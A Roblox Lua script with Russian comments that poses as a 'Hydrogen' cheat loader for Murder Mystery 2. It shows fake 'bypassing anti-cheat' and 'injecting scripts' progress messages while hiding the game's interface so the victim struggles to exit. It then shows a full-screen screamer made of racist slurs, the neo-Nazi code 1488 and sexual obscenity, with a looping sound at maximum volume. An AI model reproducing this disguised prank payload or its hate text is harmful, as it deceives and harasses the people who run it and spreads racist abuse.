-- 1. Скрываем стандартный интерфейс Роблокса, чтобы он за паникой не сразу нашел кнопку выхода
local StarterGui = game:GetService("StarterGui")
pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

-- 2. Создаем основу для GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HydrogenCore"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- ==========================================
-- ЧАСТЬ 1: КРАСИВАЯ ЗАГРУЗКА HYDROGEN
-- ==========================================

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 350, 0, 150)
loadingFrame.Position = UDim2.new(0.5, -175, 0.5, -75)
loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = loadingFrame

-- Логотип / Текст загрузки
local loadText = Instance.new("TextLabel")
loadText.Size = UDim2.new(1, 0, 0, 50)
loadText.Position = UDim2.new(0, 0, 0, 20)
loadText.BackgroundTransparency = 1
loadText.Text = "HYDROGEN\nConnecting to server..."
loadText.TextColor3 = Color3.fromRGB(0, 255, 160)
loadText.Font = Enum.Font.SourceSansBold
loadText.TextSize = 20
loadText.Parent = loadingFrame

-- Задний фон полосы загрузки
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0, 280, 0, 10)
barBg.Position = UDim2.new(0.5, -140, 0, 90)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
barBg.BorderSizePixel = 0
barBg.Parent = loadingFrame

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 5)
barCorner.Parent = barBg

-- Сама ползущая линия загрузки
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0) -- Начинаем с нуля
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 160)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 5)
fillCorner.Parent = barFill

-- Процент загрузки текстом
local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(1, 0, 0, 20)
percentText.Position = UDim2.new(0, 0, 0, 110)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.TextColor3 = Color3.fromRGB(150, 150, 150)
percentText.Font = Enum.Font.SourceSans
percentText.TextSize = 14
percentText.Parent = loadingFrame

-- ==========================================
-- АНИМАЦИЯ И ПЕРЕХОД К СКРИМЕРУ
-- ==========================================

-- Плавно двигаем полосу загрузки в течение 5 секунд
for i = 1, 100 do
    task.wait(0.05) -- Скорость загрузки
    percentText.Text = i .. "%"
    barFill.Size = UDim2.new(i / 100, 0, 1, 0)
    
    if i == 40 then
        loadText.Text = "HYDROGEN\nBypassing MM2 Anti-Cheat..."
    elseif i == 80 then
        loadText.Text = "HYDROGEN\nInjecting scripts..."
    end
end

-- Как только 100% — уничтожаем окно загрузки
loadingFrame:Destroy()

-- ==========================================
-- ЧАСТЬ 2: ФИНАЛЬНЫЙ ТРОЛЛИНГ (HELP ME + ЗВУК)
-- ==========================================

-- Черный фон на весь экран
local screamFrame = Instance.new("Frame")
screamFrame.Size = UDim2.new(1, 0, 1, 0)
screamFrame.Position = UDim2.new(0, 0, 0, 0)
screamFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
screamFrame.BackgroundTransparency = 0.1 -- Слегка видно игру, чтобы понимал, что он в ловушке
screamFrame.Parent = screenGui

-- Огромная жуткая надпись
local screamText = Instance.new("TextLabel")
screamText.Size = UDim2.new(0.8, 0, 0.4, 0)
screamText.Position = UDim2.new(0.1, 0, 0.3, 0)
screamText.BackgroundTransparency = 1
screamText.Text = "NIGGA NIGGERS NIGGERS FUCK MY DILDO \n DILDAK 1488 NIGGER"
screamText.TextColor3 = Color3.fromRGB(200, 0, 0) -- Кроваво-красный
screamText.Font = Enum.Font.Creepster -- Хоррор-шрифт
screamText.TextScaled = true
screamText.Parent = screamFrame

-- Включаем громкий зацикленный звук (ID стандартного жуткого эмбиента/крика)
local scarySound = Instance.new("Sound")
scarySound.SoundId = "rbxassetid://9069609268" -- Жуткий звук
scarySound.Volume = 10 -- Максимальная громкость
scarySound.Looped = true -- Повторять бесконечно
scarySound.Parent = game:GetService("SoundService")
scarySound:Play()

